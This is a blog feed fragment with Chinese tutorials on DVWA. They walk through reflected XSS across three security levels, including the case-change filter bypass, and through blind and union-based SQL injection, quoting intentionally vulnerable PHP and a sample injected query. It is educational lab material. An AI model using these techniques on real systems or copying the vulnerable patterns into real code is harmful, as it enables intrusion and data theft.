class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!array_key_exists (&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;, $_GET) || $_GET[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;] == &lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt; || $_GET[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $isempty = &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Hello &#39;&lt;/span&gt; . $_GET[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　果然没有对输入做任何处理的，直接代入使用。从代码中也可以看到，用户输入的内容一直在客户端范围内传输而已，并没有涉及服务器端的东西，更不用说数据库了，所以它也是非持久的，也可以说是即时性的。&lt;/p&gt;
&lt;h2 id=&quot;（二）Medium级别XSS&quot;&gt;&lt;a href=&quot;#（二）Medium级别XSS&quot; class=&quot;headerlink&quot; title=&quot;（二）Medium级别XSS&quot;&gt;&lt;/a&gt;（二）Medium级别XSS&lt;/h2&gt;&lt;p&gt;　　接下来我们来看看Medium级别的XSS，这个级别的XSS做了些简单的过滤，再用之前的方法，已经不能触发XSS了，如图：&lt;br&gt;&lt;img src=&quot;/uploads/12/12-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　可以看到，直接输出了script标签里的内容，可见其应该是过滤了script标签，那么我么就该设法绕过过滤。&lt;br&gt;　　我们试试改变script标签的大小写，即用大写字母书写，如图：&lt;br&gt;&lt;img src=&quot;/uploads/12/12-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　绕过成功，触发了XSS。&lt;br&gt;　　以此我们可以猜测，其应该是过滤了script这个字符串，且区分了大小写只过滤了小写的情况。&lt;br&gt;　　看看源码：&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!array_key_exists (&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;, $_GET) || $_GET[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;] == &lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt; || $_GET[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $isempty = &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Hello &#39;&lt;/span&gt; . str_replace(&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;script&amp;gt;&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, $_GET[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　从源码中可以看到，其的确是过滤了script，将该标签替换为空了，所以我们初次尝试时输出了script标签里的内容，因为script标签被去除了，然而这种利用替换来过滤的方法有一个弊端，就是较难考虑周全，容易疏忽，此处就忽略了大写的情况，还有大小写混合的情况。所以可以通过修改字符串大小写来绕过。&lt;/p&gt;
&lt;h2 id=&quot;（三）High级别XSS&quot;&gt;&lt;a href=&quot;#（三）High级别XSS&quot; class=&quot;headerlink&quot; title=&quot;（三）High级别XSS&quot;&gt;&lt;/a&gt;（三）High级别XSS&lt;/h2&gt;&lt;p&gt;　　High级别的XSS模块，对于XSS的防护就相对高级一些了，前面用到的方法在这里也都行不通了。&lt;br&gt;&lt;img src=&quot;/uploads/12/12-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;&lt;img src=&quot;/uploads/12/12-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　可以看到，他连script标签一起输出了，哪怕改变了大小写也没有用。&lt;br&gt;　　我们直接看看源码：&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!array_key_exists (&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;, $_GET) || $_GET[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;] == &lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt; || $_GET[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;] == &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $isempty = &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;Hello &#39;&lt;/span&gt; . htmlspecialchars($_GET[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　这里使用了php的一个函数方法htmlspecialchars对输入的内容做了处理，这个函数的作用是把预定义的&lt;code&gt;&amp;lt;&lt;/code&gt;和&lt;code&gt;&amp;gt;&lt;/code&gt;这两个符号以html的形式打印出来，而其他内容不变，所以我们最后看到了全部内容的输出。&lt;br&gt;　　这个方法一般来说也相对安全了。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文通过DVWA平台的XSS reflected模块进行反射型XSS漏洞的简单分析和原理讲解。
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>11.渗透测试平台DVWA之SQL盲注</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0DVWA%E4%B9%8BSQL%E7%9B%B2%E6%B3%A8/"/>
    <id>http://yoursite.com/渗透测试平台DVWA之SQL盲注/</id>
    <published>2016-08-04T07:31:57.000Z</published>
    <updated>2016-08-04T07:42:08.543Z</updated>
    
    <content type="html">&lt;p&gt;　　本文通过DVWA平台的SQL Injection（Blind）模块简单介绍分析了SQL盲注的原理和运用。 &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;SQL注入原理解析&quot;&gt;&lt;a href=&quot;#SQL注入原理解析&quot; class=&quot;headerlink&quot; title=&quot;SQL注入原理解析&quot;&gt;&lt;/a&gt;SQL注入原理解析&lt;/h2&gt;&lt;p&gt;　　SQL盲注跟DVWA的普通SQL注入在原理上，其实是一样的，不同的是，使用单引号已经不能作为测试注入是否存在的依据了，因为不会有sql语句报错提示，一切都是静默的，输入单引号，没有任何输出和反馈，显然是对错误信息做了处理了。&lt;br&gt;&lt;img src=&quot;/uploads/11/11-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;源码分析与运用&quot;&gt;&lt;a href=&quot;#源码分析与运用&quot; class=&quot;headerlink&quot; title=&quot;源码分析与运用&quot;&gt;&lt;/a&gt;源码分析与运用&lt;/h2&gt;&lt;p&gt;　　我们直接看源码会发现，无论Low，Medium还是High级别，源码跟DVWA的普通注入模块其实是基本一样的，唯一不同的只是在mysql_numrows函数前面加了@符号，做了预处理。&lt;br&gt;　　所以其实我们依然可以使用在DVWA的普通注入模块中的方法获取数据库数据，每个级别跟DVWA的普通注入模块获取数据方法是一样的，只是因为没有报错了，我们就要根据其它反馈信息来判断，当前的注入语句是否执行成功或有效了。&lt;br&gt;　　就如我们在进行order by判断字段数时，原先普通注入order by 3时会爆出数据库字段错误，而现在却不会，页面单纯显示空白，就像查询内容空白一样。&lt;br&gt;&lt;img src=&quot;/uploads/11/11-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　而order by 2就有了用户信息显示&lt;br&gt;&lt;img src=&quot;/uploads/11/11-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　这一样能够判断字段数为2。此时我们判断不再依据错误提示，而是页面返回内容来判断，其实跟报错判断大同小异。&lt;br&gt;　　盲注中比较不同和难分辨的就是基于时间的注入了，页面没有任何异常和不同，需要通过页面反馈的时间差异来判断SQL语句的执行情况。&lt;br&gt;　　做一个简单的测试，我们构造如下图这样的语句&lt;br&gt;&lt;img src=&quot;/uploads/11/11-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　可以看到返回数据包用了10秒左右，跟我们设定的值是基本一致的，再试试1秒看看&lt;br&gt;&lt;img src=&quot;/uploads/11/11-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从而我们可以判断，该处是可以基于时间进行盲注的。在不同数据库中，我们还会利用不同的跟时间有关的函数来判断和猜测获取数据。不过基于时间的盲注有个弊端就是，耗时比较长，而且需要稳定的网络环境，如何网络不稳定，很容易影响判断，导致失误。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;　　本文通过DVWA平台的SQL Injection（Blind）模块简单介绍分析了SQL盲注的原理和运用。
    
    </summary>
    
      <category term="others" scheme="http://yoursite.com/categories/others/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="网络安全" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>10.渗透测试平台DVWA之SQL注入</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0DVWA%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/渗透测试平台DVWA之SQL注入/</id>
    <published>2016-08-04T01:49:42.000Z</published>
    <updated>2016-08-04T04:24:53.268Z</updated>
    
    <content type="html">&lt;p&gt;　　本文通过DVWA平台的SQL Injection模块进行SQL注入漏洞的一般演示和原理解析。 &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;SQL注入原理解析&quot;&gt;&lt;a href=&quot;#SQL注入原理解析&quot; class=&quot;headerlink&quot; title=&quot;SQL注入原理解析&quot;&gt;&lt;/a&gt;SQL注入原理解析&lt;/h2&gt;&lt;p&gt;　　SQL注入，在渗透测试当中是重点关注点之一，一般都具有较高的危害，甚至可以直接获取服务器webshell。&lt;br&gt;　　SQL注入根据数据库的类型不同，注入语句会有所变化。 SQL注入原理就是通过修改正常的用户输入或数据包传递参数值，构造的特殊语句，从而改变原来的数据库语句执行，达到访问获取数据库敏感数据或执行任意数据库命令的目的。&lt;br&gt;　　SQL注入根据注入类型不同，可以分为字符型注入，数字型注入，基于时间的注入等。&lt;br&gt;　　我们先来看看DVWA平台中low级别的SQL注入式如何的。&lt;/p&gt;
&lt;h2 id=&quot;（一）Low级别SQL注入&quot;&gt;&lt;a href=&quot;#（一）Low级别SQL注入&quot; class=&quot;headerlink&quot; title=&quot;（一）Low级别SQL注入&quot;&gt;&lt;/a&gt;（一）Low级别SQL注入&lt;/h2&gt;&lt;p&gt;　　我们先看看这个级别的源码&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;Submit&#39;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// Retrieve data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $id = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;id&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $getid = &lt;span class=&quot;string&quot;&gt;&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $result = mysql_query($getid) &lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt; . mysql_error() . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $num = mysql_numrows($result);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; ($i &amp;lt; $num) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $first = mysql_result($result,$i,&lt;span class=&quot;string&quot;&gt;&quot;first_name&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $last = mysql_result($result,$i,&lt;span class=&quot;string&quot;&gt;&quot;last_name&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;pre&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;ID: &#39;&lt;/span&gt; . $id . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;br&amp;gt;First name: &#39;&lt;/span&gt; . $first . &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;br&amp;gt;Surname: &#39;&lt;/span&gt; . $last;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;/pre&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $i++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;　　可以看到，从url中接收id值，没有做任何检测过滤，直接代入sql语句当中去使用，那么我们就完全可以构造特殊的id值了。&lt;br&gt;　　回到DVWA中，我们先用单引号做下测试，爆出了sql错误&lt;br&gt;&lt;img src=&quot;/uploads/10/10-1.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　接下来进一步验证注入的存在&lt;br&gt;&lt;img src=&quot;/uploads/10/10-2.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;&lt;img src=&quot;/uploads/10/10-3.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　以第一个为例，输入的id值传入sql语句中，是原sql语句变成了&lt;br&gt;　　SELECT first_name, last_name FROM users WHERE user_id = ‘1’ and 1=1 – ‘&lt;br&gt;　　可以看到，–后面的语句被注释掉了，而—前面的依然是一个完整的sql查询语句，没有错误，但却执行了我们想要执行的sql命令and 1=1，这就是sql注入的基本原理和目的。&lt;br&gt;　　接下来就可以尝试用union来构造联合查询从而获取数据库数据了，在此之前要判断字段数，用order by语句。&lt;br&gt;&lt;img src=&quot;/uploads/10/10-4.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;&lt;img src=&quot;/uploads/10/10-5.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　确定了字段数是2，这下就可以union查询了&lt;br&gt;&lt;img src=&quot;/uploads/10/10-6.png&quot; alt=&quot;Angoddess&quot;&gt;&lt;br&gt;　　从图中可以看到，字段内容显示位置，至此我们只需要替换1，2的内容就可以查询我们想要查询的东西了，如图查询了数据库用户和当前数据库名：&lt;br&gt;&lt;img src=&quot;/uploads/10/10-7.png&quot; 